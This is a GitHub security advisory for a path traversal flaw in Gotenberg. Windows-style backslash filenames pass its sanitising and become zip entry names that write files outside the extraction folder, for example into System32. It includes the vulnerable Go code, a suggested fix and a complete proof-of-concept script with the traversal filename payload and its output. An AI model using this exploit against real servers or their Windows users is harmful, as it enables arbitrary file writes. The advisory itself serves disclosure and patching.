# [H] Gotenberg has path traversal in zip entry name via Windows-style separators in upload filename

## Summary
Severity: High
Advisory: GHSA-hwc4-gmrw-5222
CVE: CVE-2026-44829
CWE: CWE-22
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:L (CVSS_V3)
Published: 2026-05-29
Source: https://github.com/advisories/GHSA-hwc4-gmrw-5222
Type: github-advisory

## Affected
- Go: `github.com/gotenberg/gotenberg/v8` — affected >=0 <8.33.0

## Details
### Summary
`filepath.Base` on the Linux container does not strip backslashes (`\`), because `\` is only a path separator on Windows. A multipart filename like `..\..\..\..\Windows\System32\evil.pdf` survives Gotenberg's input sanitisation and lands verbatim as the zip entry name when a multi-output route returns its result as a zip (e.g. `/forms/pdfengines/split`). Windows zip extractors interpret `\` as a path separator and write the file outside the extraction directory.

### Details
`pkg/modules/api/context.go:434, 472`:
```go
filename := norm.NFC.String(filepath.Base(fh.Filename))
```
On Linux, `filepath.Base("..\\..\\..\\..\\Windows\\System32\\evil.pdf")` returns the same string verbatim — there are no `/` separators to find. The original filename then flows to `ctx.diskToOriginal` (`pkg/modules/api/context.go:459, 393`) and through `pkg/modules/pdfengines/routes.go:287-322` (`SplitPdfStub`), which builds:
```go
originalNameNoExt := strings.TrimSuffix(originalName, filepath.Ext(originalName))
newOriginal      := fmt.Sprintf("%s_%d.pdf", originalNameNoExt, i)
ctx.RegisterDiskPath(newPath, newOriginal)
```
Finally `pkg/modules/api/context.go:617-642` constructs the zip via `archives.FilesFromDisk` + `archives.Zip{}.Archive`. `mholt/archives@v0.1.5/archives.go:155-184` (`nameOnDiskToNameInArchive`) returns `path.Join(rootInArchive, "")` — the map value verbatim.

### Suggested fix
```diff
- filename := norm.NFC.String(filepath.Base(fh.Filename))
+ filename := sanitizeFilename(fh.Filename)
+
+ func sanitizeFilename(name string) string {
+     if i := strings.LastIndexAny(name, "/\\"); i >= 0 {
+         name = name[i+1:]
+     }
+     name = norm.NFC.String(name)
+     // Optional belt-and-braces:
+     name = strings.ReplaceAll(name, "..", "_")
+     name = strings.Map(func(r rune) rune {
+         if r < 0x20 || r == 0x7f { return -1 }
+         return r
+     }, name)
+     return name
+ }
```
The same sanitiser closes Advisory 8.

### PoC
**Prerequisite:** `pip install requests`. `curl -F filename=` mangles backslashes on some shells, so we use Python's `requests` to deliver the malicious filename byte-perfect.

```bash
mkdir -p /tmp/gotenberg-poc && cd /tmp/gotenberg-poc

docker rm -f gotenberg-audit 2>/dev/null
docker run -d --rm --name gotenberg-audit -p 3000:3000 gotenberg/gotenberg:8.32.0
i=0; until [ "$(curl -s -o /dev/null -w '%{http_code}' http://localhost:3000/health)" = "200" ] || [ $i -ge 30 ]; do i=$((i+1)); sleep 2; done

# Stub PDF.
printf '%%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>endobj\nxref\n0 4\n0000000000 65535 f\n0000000010 00000 n\n0000000053 00000 n\n0000000100 00000 n\ntrailer<</Size 4/Root 1 0 R>>\nstartxref\n158\n%%%%EOF\n' > stub.pdf

# Step 1: produce a 2-page PDF so /split returns multiple entries.
curl -s -o two.pdf -X POST http://localhost:3000/forms/pdfengines/merge \
    -F 'files=@stub.pdf;filename=a.pdf' \
    -F 'files=@stub.pdf;filename=b.pdf'

# Step 2: split, declaring the multipart filename as a Windows path-traversal payload.
python3 - <<'PY'
import requests, zipfile, binascii
fname = '..\\..\\..\\..\\Windows\\System32\\evil.pdf'
files = {'files': (fname, open('two.pdf', 'rb'), 'application/pdf')}
data  = {'splitMode': 'intervals', 'splitSpan': '1'}
r = requests.post('http://localhost:3000/forms/pdfengines/split', files=files, data=data)
print(f'HTTP={r.status_code}  ctype={r.headers.get("content-type")}  bytes={len(r.content)}')
open('split.zip', 'wb').write(r.content)

z = zipfile.ZipFile('split.zip')
print('--- zip entries (orig_filename) ---')
for info in z.infolist():
    print(f'   {info.orig_filename!r}')

# Show raw central-directory bytes to prove backslashes are on the wire:
data = open('split.zip', 'rb').read()
idx = data.find(b'PK\x01\x02')
print('--- raw central-dir hex around filename ---')
print(f'   {binascii.hexlify(data[idx:idx+80]).decode()}')
PY

docker stop gotenberg-audit
```

**Observed output:**
```
HTTP=200  ctype=application/zip  bytes=24750
--- zip entries (orig_filename) ---
   '..\\..\\..\\..\\Windows\\System32\\evil_0.pdf'
   '..\\..\\..\\..\\Windows\\System32\\evil_1.pdf'
--- raw central-dir hex around filename ---
   504b010214031400080800009a7da25c61b6fc178e2f00008e2f0000270009000000000000000000a481000000002e2e5c2e2e5c2e2e5c2e2e5c57696e646f77735c53797374656d33325c6576696c5f
```

The trailing hex `2e2e5c 2e2e5c 2e2e5c 2e2e5c 57696e646f7773 5c 53797374656d3332 5c 6576696c5f` decodes to `..\..\..\..\Windows\System32\evil_`. (Python's `ZipFile.namelist()` would normally hide this by displaying `/`, but `info.orig_filename` returns the literal backslash form.)

To see the Windows-side traversal effect on a Windows host, run:
```powershell
Expand-Archive -Path .\split.zip -DestinationPath .\out -Force
Get-ChildItem .\out -Recurse
# → out\Windows\System32\evil_0.pdf
# → out\Windows\System32\evil_1.pdf
```
PowerShell collapses the `..` parents but creates the `Windows\System32\` subdirectory tree. 7-Zip and WinRAR with default settings honor the `..` parents and traverse out of the extraction directory entirely.

### Impact
- Arbitrary file write on a Windows-side consumer that extracts the returned zip (Windows Explorer, 7-Zip, WinRAR, .NET `ZipFile.ExtractToDirectory`).
- Reachable via every multi-output Gotenberg route — `/forms/pdfengines/split`, `/forms/pdfengines/flatten`/`/encrypt`/`/embed`/`/watermark`/`/stamp`/`/rotate` (when called with multiple input PDFs), `/forms/libreoffice/convert` with multiple inputs, `/forms/pdfengines/convert`.
- Also reachable via `downloadFrom` upstream `Content-Disposition: filename="..\\..\\evil.exe"` — the filename flows through the same `ctx.diskToOriginal` map at `pkg/modules/api/context.go:354, 393`.

## References
- https://github.com/gotenberg/gotenberg/security/advisories/GHSA-hwc4-gmrw-5222
- https://github.com/gotenberg/gotenberg
- https://github.com/gotenberg/gotenberg/releases/tag/v8.33.0
